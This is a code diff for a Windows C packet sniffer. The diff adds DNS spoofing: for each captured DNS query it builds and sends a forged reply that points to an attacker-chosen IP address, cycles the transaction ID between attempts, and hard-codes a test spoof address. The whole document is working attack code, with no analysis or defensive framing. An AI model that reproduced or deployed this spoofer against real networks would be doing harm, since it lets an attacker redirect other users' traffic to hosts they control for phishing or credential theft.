@@ -7,6 +7,8 @@
 #include <WS2tcpip.h>
 #include <stdint.h>
 
+#include "DNSClient.h"
+
 #pragma comment(lib, "Ws2_32.lib")
 
 struct pcap_timeval {
@@ -46,15 +48,15 @@ ip_packet;
 
 #pragma pack(1)
 
-void dump_packets(unsigned char* buffer) {
+int dump_packets(unsigned char* buffer, char spoofIP[4], int transIdInc = 1) {
 	ip_packet* packet = (ip_packet*)buffer;
 
 	int ipLenght = (packet->versionAndLength & 0b00001111)* (packet->versionAndLength >> 4);
 
-	if (packet->protocol == 6) {
+	if (packet->protocol == IPPROTO_TCP) {
 		// tcp
 	}
-	else if (packet->protocol == 17) {
+	else if (packet->protocol == IPPROTO_UDP) {
 
 		unsigned short sourcePort = *(buffer + ipLenght+1) + *(buffer + ipLenght + 2);
 		unsigned short destPort = *(buffer + ipLenght + 3) + *(buffer + ipLenght + 4);
@@ -89,24 +91,40 @@ void dump_packets(unsigned char* buffer) {
 			printf("Transaction ID: %u\n", transactionId);
 #endif
 
-			// TODO: send dns spoof replay
+			// send dns spoof replay
+			char sourceIP[4];
+			sourceIP[0] = *(buffer + ipLenght - 8);
+			sourceIP[1] = *(buffer + ipLenght - 7);
+			sourceIP[2] = *(buffer + ipLenght - 6);
+			sourceIP[3] = *(buffer + ipLenght - 5);
 
-			// domain section
-			unsigned char* dnsRecord = (unsigned char*)(buffer + ipLenght + UDP_HEADER_LEN + 12);
+			char* dnsRecord = (char*)(buffer + ipLenght + UDP_HEADER_LEN + 13);
 
-#ifdef LOG
-			for (int i = 0; i < udpLength; i++) {
-				printf("%c", dnsRecord[i]);
+			for(int i = 0;i < udpLength; i++) {
+				if (!(dnsRecord[i] >= 65 && dnsRecord[i] <= 90) && 
+					!(dnsRecord[i] >= 97 && dnsRecord[i] <= 122)) {
+					// replacing a number with the dot
+					dnsRecord[i] = '.';
+				}
 			}
 
-			printf("\n\n\n");
-#endif
+			int packet_len = 0;
+			char* packet = prepare_dns_packet(dnsRecord, udpLength, &packet_len, transactionId+transIdInc, spoofIP);
+			int result = send_dns_packet(packet, packet_len, sourcePort, sourceIP);
 
+#ifdef LOG
+			printf("Sent DNS Replay packet with trans id: %u\n", transactionId+transIdInc);
+#endif
+			free(packet);
+
+			return 1;
 		}
 	}
+
+	return 0;
 }
 
-void start_sniffing(char* interface_ip) {
+void start_sniffing(char* interface_ip, char spoofIP[4]) {
 	WSAData wsaData;
 	int stratupResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (stratupResult != 0) {
@@ -146,6 +164,8 @@ void start_sniffing(char* interface_ip) {
 		fprintf(stderr, "while allocating buffer for recv");
 		exit(-1);
 	}
+	
+	int transIdInc = 1;
 
 	while (1) {
 		memset(buffer, 0, BUFFER_SIZE_HDR + BUFFER_SIZE_PKT);
@@ -156,7 +176,10 @@ void start_sniffing(char* interface_ip) {
 			exit(-1);
 		}
 
-		dump_packets(buffer + BUFFER_OFFSET_IP);
+		result = dump_packets(buffer + BUFFER_OFFSET_IP, spoofIP, transIdInc);
+		if (result) {
+			transIdInc++;
+		}
 	}
 
 	free(buffer);
@@ -168,10 +191,20 @@ void start_sniffing(char* interface_ip) {
 
 int main(int argc, char** argv) {
 
-	if (argc != 2) {
-		fprintf(stderr, "Usage: %s <ip-of-interface>\n", argv[0]);
+	if (argc != 3) {
+		fprintf(stderr, "Usage: %s <ip-of-interface> <spoof-ip>\n", argv[0]);
 		exit(-1);
 	}
 
-	start_sniffing(argv[1]);
+	char *ip = (char*)malloc(sizeof(char)*4);
+	ip[0] = 192;
+	ip[1] = 168;
+	ip[2] = 1;
+	ip[3] = 2;
+
+	start_sniffing(argv[1], ip); // for testing
+
+	//start_sniffing(argv[1], argv[2]); // for production
+
+	free(ip);
 }
